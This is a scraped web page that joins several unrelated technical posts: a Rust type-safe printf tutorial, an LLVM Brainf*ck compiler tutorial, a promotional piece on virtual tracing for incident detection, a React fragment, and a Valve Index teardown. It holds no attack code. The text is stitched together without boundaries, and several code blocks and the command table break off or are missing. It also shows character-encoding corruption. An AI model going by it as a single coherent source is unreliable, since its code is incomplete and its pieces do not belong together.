<div><div><pre><code><span>impl</span> <span>Format</span><span>&lt;</span><span>HNil</span><span>&gt;</span> <span>for</span> <span>HNil</span> <span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>_</span><span>args</span><span>:</span> <span>HNil</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>""</span><span>.to_string</span><span>()</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This impl says that when we reach the end of a format list, just return the empty string. And the only argument we will accept is an empty argument list. Combined with the next impls, this inductively ensures that extra arguments are not accepted.</p>

<p>Next, we will implement <code>FString</code>. This implementation should use the string constant contained in the <code>FString</code> struct, and combine it recursively with the rest of the format list. We don’t use variadic arguments for <code>FString</code>, so they get passed along. In Rust, this English specification becomes:</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FString</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span> <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>ArgList</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>self</span><span>.head</span><span>.</span><span>0</span><span>.to_owned</span><span>()</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Note that we have to add <code>FmtList: Format&lt;ArgList&gt;</code> to ensure the recursive call to <code>self.tail.format</code> works. Also note that we aren’t implementing <code>Format</code> directly on <code>FString</code>, but rather on an H-list containing <code>FString</code>.</p>

<p>Finally, the most complex case, <code>FVar</code>. We want this impl to take an argument from the <code>ArgList</code>, then format the remaining format list with the remaining arguments.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FVar</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span>
  <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span><span>,</span>
  <span>T</span><span>:</span> <span>ToString</span><span>,</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>args</span><span>.head</span><span>.to_string</span><span>()</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>.tail</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Be careful to observe which H-list is being accessed by <code>head</code> and <code>tail</code>. Here, the <code>args</code> H-list provides the data to fill the hole via <code>args.head</code>.</p>

<h2 id="checking-our-properties">Checking our properties</h2>

<p>With this implementation, our correct example successfully compiles and runs:</p>

<div><div><pre><code><span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span>
  <span>FString</span><span>(</span><span>"Hello "</span><span>),</span> <span>FVar</span><span>,</span> <span>FString</span><span>(</span><span>"! The first prime is "</span><span>),</span> <span>FVar</span>
<span>];</span>
<span>assert_eq!</span><span>(</span>
  <span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"world"</span><span>,</span> <span>2</span><span>]),</span>
  <span>"Hello world! The first prime is 2"</span>
<span>);</span>
</code></pre></div></div>

<p>What about our incorrect example? If we write this:</p>

<div><div><pre><code><span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"just one arg"</span><span>]);</span>
</code></pre></div></div>

<p>This code fails to compile with the error:</p>

<div><div><pre><code>error[E0308]: mismatched types
  --&gt; src/printf.rs:48:18
   |
48 |   example.format(hlist!["just one arg"]);
   |                  ^^^^^^^^^^^^^^^^^^^^^^
   |                  expected struct `Cons`, found struct `HNil`
   |
   = note: expected struct `HCons&lt;_, HNil&gt;`
              found struct `HNil`
</code></pre></div></div>

<p>While the error is enigmatic, our mistake is at least correctly caught at compile-time. This is because Rust deduces that <code>example.format()</code> expects an H-list of the shape <code>HCons&lt;_, HCons&lt;_, HNil&gt;&gt;</code>, but it finds <code>HNil</code> too soon in our 1-element H-list. A similar error occurs when providing too many args.</p>

<p>Stupendous! We have successfully implemented a type-safe printf using H-lists and traits.</p>

<h2 id="extending-our-abstraction">Extending our abstraction</h2>

<p>Right now, our <code>Format</code> function just checks that the format list and argument list are the same length. We could extend our format structures, for example to ensure that an <code>FVar</code> must be a particular type, or must use <code>Debug</code> vs. <code>Display</code>. Here’s the sketch of such a strategy:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>PhantomData</span><span>;</span>

<span>// Add flags for whether using Display or Debug</span>
<span>pub</span> <span>struct</span> <span>FDisplay</span><span>;</span>
<span>pub</span> <span>struct</span> <span>FDebug</span><span>;</span>

<span>// Use a type parameter with PhantomData to represent the intended type</span>
<span>pub</span> <span>struct</span> <span>FVar</span><span>&lt;</span><span>T</span><span>,</span> <span>Flag</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>(</span><span>T</span><span>,</span> <span>Flag</span><span>)</span><span>&gt;</span><span>);</span>

<span>// Now, T has to be the same between the format list and arg list</span>
<span>// Also, FDisplay flag requires that `T: Display`</span>
<span>impl</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FVar</span><span>&lt;</span><span>T</span><span>,</span> <span>FDisplay</span><span>&gt;</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span>
  <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span><span>,</span>
  <span>T</span><span>:</span> <span>Display</span><span>,</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>// using format! is cheating, but you get the idea</span>
    <span>format!</span><span>(</span><span>"{}"</span><span>,</span> <span>args</span><span>)</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>.tail</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>// Similar impl for `T: Debug` when `FDebug` is used</span>
</code></pre></div></div>

<p>With this approach, if our format list and arg list differ in type:</p>

<div><div><pre><code><span>let</span> <span>fmt</span> <span>=</span> <span>hlist!</span><span>[</span><span>FString</span><span>(</span><span>"n: "</span><span>),</span> <span>FVar</span><span>::</span><span>&lt;</span><span>i32</span><span>,</span> <span>FDisplay</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>)];</span>
<span>fmt</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"not a number"</span><span>]);</span>
</code></pre></div></div>

<p>Then the code will not compile with the error, <code>&amp;'static str is not i32</code>.</p>

    <p><a href="https://llvm.org/">LLVM</a> is a collection of compiler toolchain technologies  used to compile dynamic and static programming languages. Itâ€™s heavly used in programming languages, such as <a href="https://clang.llvm.org/">Clang</a>, <a href="https://emscripten.org/">Emscripten</a>, and <a href="https://www.rust-lang.org/">Rust</a>!</p>

<p>This tutorial is going to go over how to create a simple compiler using LLVM for <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainf*ck</a> in Rust. The completed code can be found here: <a href="https://github.com/benkonz/brainfrick-rust">brainfrick-rust</a></p>



<p><a href="https://en.wikipedia.org/wiki/Brainfuck">Brainf-ck</a> is a very simple, turing complete, programming language that is made up of 8 commands. Each command is a single character, so parsing out an entire brainf*ck file is easy. Just read every character and match the character with a command. If the character isnâ€™t a command, just skip it and move to the next character.</p>

<h2 id="commands">Commands</h2>

<table>
  <thead>
    <tr>
      <th>Character</th>
      <th>Meaning</th>
    </tr>

    <tr>

      <td>if the byte at the data pointer is zero, then move the program counter to instruction after the matching <code>]</code>, otherwise move to the next instruction</td>
    </tr>
    <tr>
      <td><code>]</code></td>
      <td>if the byte at the data pointer is nonzero, then move the program counter to the instruction after the matching <code>[</code>, otherwise move to the next instruction</td>
    </tr>
  </tbody>
</table>

<h2 id="sample-program">Sample Program</h2>

<p>This simple program is going to add the current cellâ€™s value to the next cell</p>



<p>Think of <code>[</code> and <code>]</code> as <code>while (*data_ptr) {</code> and <code>}</code>, respectivly.
We decrement the current cellâ€™s value with <code>-</code>, then increment the <code>data_ptr</code> with <code>&gt;</code>, then increment the new value at our data pointer with <code>+</code>, then decrement the <code>data_ptr</code> back to where it was at the start of the loop with <code>-</code>.</p>

<p>Since this is surrounded in a <code>[</code> <code>]</code>, we are going to do this until the value at the <code>data_ptr</code> is <code>0</code>, effectivly adding the value at the <code>data_ptr</code> to the next value in memory.</p>



<p>This project uses <a href="https://releases.llvm.org/10.0.0/docs/ReleaseNotes.html">LLVM-10</a>, as well as <a href="https://crates.io/">Cargo</a>.</p>

<p>Start with:</p>

<div><div><pre><code>cargo new --bin brainfrick-rust
</code></pre></div></div>

<p>then edit the <code>Cargo.toml</code> file and add this to the dependencies:</p>

<div><div><pre><code><span>inkwell</span> <span>=</span> <span>{</span> <span>git</span> <span>=</span> <span>"https://github.com/TheDan64/inkwell"</span><span>,</span> <span>branch</span> <span>=</span> <span>"llvm10-0"</span> <span>}</span>
<span>clap</span> <span>=</span> <span>"2.33"</span>
</code></pre></div></div>

<p><code>clap</code> is used to make parsing command line args easier</p>

<p>Verify that everything works by running:</p>



<p>Unless youâ€™ve already installed the LLVM-10 development files on your machine, you will probably get an error message complaining about being unable to find LLVM-10. If thatâ€™s the case, just follow the â€œCompiling LLVMâ€� instructions <a href="https://crates.io/crates/llvm-sys">here</a>.</p>



<p>Weâ€™re going to start by making a simple executable that just returns <code>0</code>.</p>

<p>To start, weâ€™ll parse out the command line args. The first argument will be our input file and the <code>-o OUTPUT</code> will be our output file.</p>

<p>Next, weâ€™ll create our <code>context</code>, <code>module</code>, and <code>builder</code></p>

<span>let</span> <span>builder</span> <span>=</span> <span>context</span><span>.create_builder</span><span>();</span>
</code></pre></div></div>

<p>After that, weâ€™ll create a main function type, which takes no arguments and returns an <code>i32</code> and add it to our module</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>module</span><span>::</span><span>Linkage</span><span>;</span>

<span>let</span> <span>i32_type</span> <span>=</span> <span>context</span><span>.i32_type</span><span>();</span>
<span>let</span> <span>main_fn_type</span> <span>=</span> <span>i32_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[],</span> <span>false</span><span>);</span>
<span>let</span> <span>main_fn</span> <span>=</span> <span>module</span>
                <span>.add_function</span><span>(</span><span>"main"</span><span>,</span> <span>main_fn_type</span><span>,</span> <span>Some</span><span>(</span><span>Linkage</span><span>::</span><span>External</span><span>));</span>
</code></pre></div></div>

<p>Next, weâ€™ll set the builderâ€™s instruction pointer to the main function and use it to build a return instruction</p>

<div><div><pre><code><span>let</span> <span>basic_block</span> <span>=</span> <span>context</span><span>.append_basic_block</span><span>(</span><span>main_fn</span><span>,</span> <span>"entry"</span><span>);</span>
<span>builder</span><span>.position_at_end</span><span>(</span><span>basic_block</span><span>);</span>

<span>// our compiler will go here</span>

<span>let</span> <span>i32_zero</span> <span>=</span> <span>i32_type</span><span>.const_int</span><span>(</span><span>0</span><span>,</span> <span>false</span><span>);</span>
<span>builder</span><span>.build_return</span><span>(</span><span>Some</span><span>(</span><span>&amp;</span><span>i32_zero</span><span>));</span>
</code></pre></div></div>

<p>Finally, weâ€™ll have to setup LLVM to convert the builder to machine code and write that result to a file</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>targets</span><span>::{</span>

</code></pre></div></div>

<p>The <code>FileType::Object</code> can be changed to <code>FileType::Assembly</code> to write human-readable machine instructions, which is very useful for debugging your compiler</p>

<h2 id="running-the-executable">Running the executable</h2>

<p>By setting the file type to <code>FileType::Object</code>, LLVM will produce an <a href="https://en.wikipedia.org/wiki/Object_file">Object File</a>. That file cannot be run by itself, and needs to be linked togeather by a linker. Typically, this is ued by <a href="https://linux.die.net/man/1/ld">ld</a>, but the right arguments to <code>ld</code> varies based on Linux disro. The easier way to link your object file is with <a href="https://gcc.gnu.org/">gcc</a>, which, internally, calls <code>ld</code> with the right args.</p>

<div><div><pre><code>cargo run INPUT_FILE -o OUTPUT_FILE
gcc OUTPUT_FILE -o OUTPUT_FILE.exe
./OUTPUT_FILE.exe
echo $?
0
</code></pre></div></div>

<p>The <code>echo $?</code> should print out the status code of the last program. You can modify the <code>let i32_zero = i32_type.const_int(0, false);</code> line to return any integer.</p>



<p>Before we start compiling our source program, we need to initialize the memory that our brainf*ck programs will use. This means calling the <a href="https://en.cppreference.com/w/c/memory/calloc">calloc</a> libc call.</p>

<p>After weâ€™ve initialized our <code>builder</code>, weâ€™re going to add this code</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>AddressSpace</span><span>;</span>

<span>let</span> <span>i64_type</span> <span>=</span> <span>context</span><span>.i64_type</span><span>();</span>
<span>let</span> <span>i8_type</span> <span>=</span> <span>context</span><span>.i8_type</span><span>();</span>
<span>let</span> <span>i8_ptr_type</span> <span>=</span> <span>i8_type</span><span>.ptr_type</span><span>(</span><span>AddressSpace</span><span>::</span><span>Generic</span><span>);</span>

</code></pre></div></div>

<p>Weâ€™re also going to want to add the <code>getchar</code> and <code>putchar</code> functions, which are going to get used by the <code>.</code> and  <code>,</code> commands.</p>

<div><div><pre><code><span>let</span> <span>getchar_fn_type</span> <span>=</span> <span>i32_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[],</span> <span>false</span><span>);</span>
<span>let</span> <span>getchar_fn</span> <span>=</span><span>module</span>

</code></pre></div></div>

<p>Next, weâ€™re going to call <code>calloc</code> and initialize our <code>data</code> and <code>ptr</code> variables, which will both point to the result of our <code>calloc</code> call. After the <code>builder.position_at_end(basic_block);</code> line, weâ€™re going to add this code:</p>

<div><div><pre><code><span>let</span> <span>i8_type</span> <span>=</span> <span>context</span><span>.i8_type</span><span>();</span>
<span>let</span> <span>i8_ptr_type</span> <span>=</span> <span>i8_type</span><span>.ptr_type</span><span>(</span><span>AddressSpace</span><span>::</span><span>Generic</span><span>);</span>

<span>let</span> <span>ptr</span> <span>=</span> <span>builder</span><span>.build_alloca</span><span>(</span><span>i8_ptr_type</span><span>,</span> <span>"ptr"</span><span>);</span>

<span>let</span> <span>i64_type</span> <span>=</span> <span>context</span><span>.i64_type</span><span>();</span>
<span>let</span> <span>i64_memory_size</span> <span>=</span> <span>i64_type</span><span>.const_int</span><span>(</span><span>30_000</span><span>,</span> <span>false</span><span>);</span>
<span>let</span> <span>i64_element_size</span> <span>=</span> <span>i64_type</span><span>.const_int</span><span>(</span><span>1</span><span>,</span> <span>false</span><span>);</span>

<span>let</span> <span>data_ptr</span> <span>=</span> <span>builder</span><span>.build_call</span><span>(</span>
    <span>calloc_fn</span><span>,</span>
    <span>&amp;</span><span>[</span><span>i64_memory_size</span><span>.into</span><span>(),</span> <span>i64_element_size</span><span>.into</span><span>()],</span>
    <span>"calloc_call"</span><span>,</span>
<span>);</span>
<span>let</span> <span>data_ptr_result</span><span>:</span> <span>Result</span><span>&lt;</span><span>_</span><span>,</span> <span>_</span><span>&gt;</span> <span>=</span> <span>data_ptr</span><span>.try_as_basic_value</span><span>()</span><span>.flip</span><span>()</span><span>.into</span><span>();</span>
<span>let</span> <span>data_ptr_basic_val</span> <span>=</span>
    <span>data_ptr_result</span><span>.map_err</span><span>(|</span><span>_</span><span>|</span> <span>"calloc returned void for some reason!"</span><span>)</span><span>?</span><span>;</span>

<span>builder</span><span>.build_store</span><span>(</span><span>data</span><span>,</span> <span>data_ptr_basic_val</span><span>);</span>
<span>builder</span><span>.build_store</span><span>(</span><span>ptr</span><span>,</span> <span>data_ptr_basic_val</span><span>);</span>
</code></pre></div></div>

<p>Finally, weâ€™re going to call <a href="https://en.cppreference.com/w/c/memory/free">free</a> on our <code>data</code> pointer. This isnâ€™t really necessary, since the program ends right after, but it is good practice. LLVM has a convience function called <code>build_free</code>, so we donâ€™t need to add the free function to our module.</p>

<div><div><pre><code>  <span>builder</span>
    <span>.build_free</span><span>(</span><span>builder</span><span>.build_load</span><span>(</span><span>data</span><span>,</span> <span>"load"</span><span>)</span><span>.into_pointer_value</span><span>());</span>

</code></pre></div></div>

<p>Letâ€™s verify that everything is working correctly. Recompile our code and make another executable with <code>cargo run</code>. Re-link it with <code>gcc</code>, then run <code>ltrace ./OUTPUT_FILE.exe</code>. You should see something like this:</p>

<div><div><pre><code>calloc(30000, 1)        = 0x55a9ec9482a0
free(0x55a9ec9482a0)    = &lt;void&gt;
+++ exited (status 0) +++
</code></pre></div></div>

<p><code>ltrace</code> traces all of the library calls of an executable, so we should see a call to <code>calloc</code> and a call to <code>free</code>.</p>

<p>Weâ€™ll need to setup some boilerplate code to read in our input file and iterate through all of the characters. After <code>builder.build_store(ptr, data_ptr_basic_val);</code>, add</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>fs</span><span>::</span><span>File</span><span>;</span>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2>The promise of tracing</h2>
<p>Distributed tracing is commonly used in Application Performance Monitoring (APM) to monitor and manage application performance, giving a view into what parts of a transaction call chain are slowest. It is a powerful tool for monitoring call completion times and examining particular requests and transactions.</p>
<!--more--><p>Quite beyond APM, it seems natural to expect tracing to yield a ‘troubleshooting tool to rule them all’. The detail and semantic locality of the trace, coupled with the depth of the service call graph, generate this expectation. It’s obvious that correlating across services gives diagnostic power. The typical traceview screams the sort of “first this, then that” narrative RCAs are made of.</p>

<p>In reality, though, users have seen mixed results. According to a prospect:</p>

<p><em>“We paid six figures for a &lt;well-known tracing tool&gt; contract, to reduce MTTR significantly. We’ve given up on that. We’re writing it off. Engineers had to do extra work to implement it. Operations had to do extra work to set and respond to alerts. The alerts worked well but, in the end, finding root-cause was still slow. It just wasn’t worth it.”</em></p>

<p>This is not isolated feedback.</p>
<h2>“Tell me where to focus”</h2>
<p>There are two issues raised: work required to yield results, and inadequacy of those results. The first issue is easy to understand: depending on the stack, the application, the application’s evolution, the deployment mechanisms and so on, it may indeed be a lot of work to generate useful traces. This problem is not surprising and can be surmounted; it is worth taking away that zero-configuration, zero-instrumentation (i.e., <em>autonomous</em>) solutions are of great value.</p>

<p>The larger issue is around applicability for root-cause detection. Here, respected Observability author and blogger Cindy Sridharan has some insightful things to say. I’ll lift a quote <a href="https://medium.com/@copyconstruct/distributed-tracing-weve-been-doing-it-wrong-39fc92a857df" rel="noopener" target="_blank">from her article</a>&nbsp;which I highly recommend:</p>

<p><em>“What’s ideally required at the time of debugging is a tool that’ll help&nbsp;reduce the search space… Instead of seeing an entire trace, what I really want to be seeing is a&nbsp;portion&nbsp;of the trace where something interesting or unusual is happening… dynamically generated service topology views&nbsp;based on specific attributes like error rate or response time…”</em></p>

<p>We need a tool that takes a stab at incident and, if possible, root-cause detection, or highlighting. Stepping back further, I would posit that trace data has become a bit like log data: a treasure trove of untapped information for root-cause detection, in-part because there is just too much detail to sift through without help.</p>
<h2>Virtual tracing alone</h2>
<p>Tracing is so promising for troubleshooting because of semantic locality. Tracing works the way it does because span ids are passed around the stack - in headers or log lines, for example. These spans are then associated together into a trace, and so we know all the spans in the trace are at least to some extent “about” the same thing - a transaction or request, for example.</p>

<p>There are other ways to establish semantic locality. Looking again at a trace, we might note that its spans demonstrate temporal locality, as well. We might suppose that a majority of service-impacting incidents also have temporal locality: if Service A fails, and Service B calls Service A, then Service B is likely also to fail, soon after Service A does. Our job will be to determine spans of telemetric data that share semantic locality.</p>

<p>Could we suppose that events happening nearby in time are semantically related? Of course not… but, we could look for features in *ordinary telemetry* - “rareness” or “badness”, for example - and model inter-occurrence intervals of such features across services. Rareness might be indicated by rare log events from a given container, for example, or a multi-hour peak in a metric; badness might be indicated by a flurry of errors from another container, or a host log.</p>

<p>Machine learning could observe the ordinary behavior of the system to estimate parameters for our model, and then use the model to hypothesize which features ARE semantically related, with high probability. Related features would in this way correspond to a virtual trace; each virtual span would map directly to a timespan of telemetric data capture for a single generator - host, container, or service, for example.</p>
<h2>A virtual tracing example</h2>
<p>A database server is inadvertently shut down. A number of rare events are emitted into its log stream; a rare spike in available memory occurs on the host(s). A few seconds later, a flurry of unusual errors are emitted in the log stream of a service reliant on the database because it cannot connect to the database.</p>

<p>Say, rare events in the database log stream happen at random about once per day, on average; rare errors in the consumer’s log stream happen about once every hour; comparable spikes in available memory happen twice a day. But now, all three of these rare things happened within 3 seconds.</p>

<p>The ML model decides these all should be part of a virtual trace, as a result; we construct spans of related activity on each generator - contiguous timespans, in fact - and bundle them up. If there was enough badness, we notify; we fingerprint to keep track of separate “trace types”. In this way we’ve achieved the goals of autonomous incident and root-cause detection; we can present only the data and services where attention should be focused.</p>

<h2>Virtual and instrumented tracing combined</h2>
<p>Combining these approaches yields real opportunities for improving the user experience. The instrumented trace augments the virtual one. For example, the service graph can be used to exclude virtual spans from a virtual trace based on implausibility of the related generator causing the observed badness; the full trace can give deep performance context to the virtual trace and serve as a launching-off point to navigate to other services and/or similar traces. Instrumented tracing brings precision, depth, and broad context to a virtual trace.</p>

<p>Similarly, the virtual trace augments the instrumented one. We can hone or auto-tune our alerting based on badness seen in the virtual trace; we can hone the traceview to just those services and components touching the virtual trace, and then allow the user to expand outward, if need be. Virtual tracing brings autonomy, incident detection, and root-cause indication to an instrumented trace.</p>

<p>Zebrium has built an implementation of virtual tracing into its autonomous log management and monitoring platform. <a href="https://www.zebrium.com/" rel=" noopener">You can read more about it here</a>.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><article><p>React Components for wrapping content often use the <code>children</code> pattern. For example, this <code>&lt;Card&gt;</code> wraps the text "Hello World":</p><p>The size of the <code>&lt;Card&gt;</code> could be set with a prop:</p><div><pre><code><span>&lt;</span><span>Card</span><span> </span><span>size</span><span>=</span><span>"</span><span>large</span><span>"</span><span>&gt;</span><span>Hello World</span><span>&lt;/</span><span>Card</span><span>&gt;</span></code></pre></div><p>This pattern works if <code>&lt;Card&gt;</code> has just one content section but not if it has multiple. In that case the content might be provided by <code>props</code> instead of <code>children</code>:</p><div><pre><code><span>&lt;</span><span>Card</span><span>
</span><span>  </span><span>size</span><span>=</span><span>"</span><span>large</span><span>"</span><span>

</span><span></span><span>/&gt;</span></code></pre></div><p>Unfortunately this makes unfamiliar components hard to understand since prop might configure the appearance of the <code>&lt;Card&gt;</code> or defines it's content. It also becomes messy when the content is not plain text:</p><div><pre><code><span>&lt;</span><span>Card</span><span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>If you have ever wondered what is inside Valve Index, you might have stumbled upon my <a href="https://www.reddit.com/r/ValveIndex/comments/cpayc5/valve_index_disassembly/">reddit post from 2019</a>. I’ve decided to dive into the details of what makes Valve Index great and share my thoughts on tech inside.</p>

<p>Teardown should begin from the simplest parts - remove the face mask (held by just magnets), unplug the main cable, and remove headphones that are held in place by a single screw each. Next remove the rubber cover that is glued around lenses. It’s not that well glued, you can just pull it off.</p>

<p><img src="https://www.thevrist.com/assets/images/index1.jpg" alt="">
<em>Rubber cover that prevents dust from getting inside lenses</em></p>

<p>Let’s start with a front panel - glossy front panel is removed by hand, since it is only held by magnets (but you already knew that from all the numerous pictures of people shoving stuff in the frunk of the headset). The rest of the front panel can be easily split in two parts. First is the frunk section, it will give you access to the main circuit board of the headset. You can remove it quite painlessly if you have the correct screwdriver. This panel does not contain any electronics.</p>

<p><img src="https://www.thevrist.com/assets/images/index-face.jpg" alt="">
<em>Just look at this beauty</em></p>

<p>Second part of the front panel is more complex. It contains tracking points for the SteamVR tracking - you can see them by looking at the plastic at different angles - plastic covering tracking points is thinner so laser beams from base stations could shoot through it. SteamVR trackers are split in two independent parts, which are connected to the main circuit separately. Also this panel contains two front facing cameras, which makes the process of taking it off even more delicate. You have to disconnect two cameras and two halves of the tracking plate’s system to finally fully reveal the main circuit.</p>

<h2 id="main-circuit">Main Circuit</h2>

<p><img src="https://www.thevrist.com/assets/images/index2.jpg" alt="">
<em>The “meat” of Valve Index</em></p>

<p>Finally we get to the main computing power of the headset. You can identify the main points of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index3-1.png" alt="">
<em>This is where all the cables connect to the HMD</em></p>

<p>On the top there is a metal connector with FPC cable going in. It is going to the smaller circuit in the top part of the headset where the cable plugs in the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index4.jpg" alt="">
<em>Circuit board with main cable and 3.5 mm audio port. It also connects to the proximity sensor</em></p>

<p>Same circuit has a 3.5 mm audio port for connecting headphones (I bet you didn’t know there is an audio jack) and proximity sensor between lenses. Last one is used for turning off the screens when the headset is not on the head.</p>

<p><img src="https://www.thevrist.com/assets/images/index2-1.png" alt="">
<em>SteamVR tracking points are connected here</em></p>

<p>On the sides of the main circuit board there are two black FPC cables. Those are going to the SteamVR tracking dots located in the sides of the headsets. Here is a picture of the tracking “web” when taken out of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index5.jpg" alt="">
<em>One side of SteamVR tracking web taken out of the HMD</em></p>

<p>Final two FPC cables are orange color and located at the bottom of the main board. They are connecting to a pair of displays located right behind this circuit.</p>

<h2 id="microchips">Microchips</h2>

<p>Now it is time to dive in a wonderful world of microchips and circuit boards. I want to thank <a href="https://www.linkedin.com/in/popovs/">Sergejs Popovs</a> for helping to identify most of the components on the board.</p>

<p>Let’s start with simple chips. Here are two bluetooth <a href="https://www.nordicsemi.com/Products/Low-power-short-range-wireless/nRF52840">chips from Nordic Semiconductors</a>. Each of these chips is used for connecting one controller with the headset. That’s why there is a limitation of two devices connected to the HMD. If you want to connect more devices (Vive Trackers or other controllers) you will need to use a USB dongle with a separate Bluetooth chip.</p>

<p><img src="https://www.thevrist.com/assets/images/index6.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index7.jpg" alt="">
<em>Bluetooth microchips, each connects to one device</em></p>

<p>Do you remember the USB port in the frunk? Well, this is a <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/USB5744-Data-Sheet-DS00001855J.pdf">chip from Microchip</a> for that USB port - hence USB in the name.</p>

<p><img src="https://www.thevrist.com/assets/images/index4-4.jpg" alt="">
<em>USB chip for USB port next to it</em></p>

<p>Here is a <a href="https://www.via-labs.com/product_show.php?id=96">chip from Via-Labs</a>. It has a purpose of converting USB 3.1 signal to the 2.0 one. Some of the chips on the circuit are not advanced enough to understand 3.1 USB, so this chip “dumbs it down”. When the signal will need to go back to the PC, the chip will convert the signal back to the USB 3.1.</p>

<p><img src="https://www.thevrist.com/assets/images/index8.jpg" alt="">
<em>USB signal converter chip</em></p>

<p>This is a flash memory chip from <a href="https://www.digikey.com/products/en/integrated-circuits-ics/memory/774?k=w25q32jw">Winbond Electronics</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index9.jpg" alt="">
<em>Flash memory can be used for different kinds of tasks</em></p>

<p>Next are these two microchips. The smaller one is a <a href="https://www.analogix.com/en/products/dp-mipi-converters/anx7530">SlimPort® 4K receiver from Analogix</a>. It is capable of receiving Image in 4K at 60 Hz, but since screens in Valve Index are only 1440 by 1600 pixels it allows to process video at 90, 120, and even 144 Hz. It also splits the signal in two allowing each display to get its own image.</p>

<p><img src="https://www.thevrist.com/assets/images/index10.jpg" alt="">
<em>Video chips convert image that you see in your SteamVR mirror in beautiful VR image</em></p>

<p>Larger chip is a multipurpose <a href="https://www.digikey.com/products/en/integrated-circuits-ics/embedded-fpgas-field-programmable-gate-array/696?k=ICE40HX8K">FPGA (Field Programmable Gate Array) chip from Lattice Semiconductor</a>. It is used for tracking - all the data received from the tracking sensors is gathered here. This chip combined with the <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11289-32-bit-Cortex-M4-Microcontroller-SAM-G55_Summary-Datasheet.pdf">Atmel MCU</a> (located on the other side of the circuit board) are doing all the necessary tracking calculations.</p>

<p><a href="http://www.etron.com.tw/cn/products/webcam_detial.php?Product_ID=10">EtronTech microchip</a> is used for merging video feeds from external cameras and transmitting it to your PC.</p>

<p><img src="https://www.thevrist.com/assets/images/index11.jpg" alt="">
<em>Microchip for processing image from webcams</em></p>

<p>Last two chips on this side of the circuit from <a href="https://www.silabs.com/power/efp01-power-management-ic">SiliconLabs</a> are most likely related to power regulation. Both of them are located near the capacitors and an inductor (metal thingy with 150 written on it). These are making sure that nothing will get too hot on your face.</p>

<p><img src="https://www.thevrist.com/assets/images/index12.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index13.jpg" alt="">
<em>Power regulating microchips</em></p>

